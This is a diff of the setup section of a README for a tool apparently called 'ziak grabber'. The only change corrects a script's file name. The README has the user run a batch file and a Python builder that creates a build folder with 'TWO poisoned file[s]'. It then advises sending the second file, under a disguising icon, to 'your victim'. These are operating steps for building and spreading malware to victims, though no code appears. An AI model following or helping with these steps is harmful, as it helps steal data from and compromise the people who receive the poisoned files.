@@ -1,7 +1,7 @@
 SETUP: 
 
 Launch the download.bat, this will download you all the necessary modules.
-Once you did that start the ziak grabber-.py as python (right click open with Python, you need to download it first on your computer https://www.python.org/downloads/) 
+Once you did that start the ziakgrabber-.py as python (right click open with Python, you need to download it first on your computer https://www.python.org/downloads/) 
 Then the program will start just put what it ask and its good to work. 
 It will create you a build folder with TWO poisoned file (I recommend to send the second one with this icon to your victim : https://ibb.co/yFhkjMt)
 
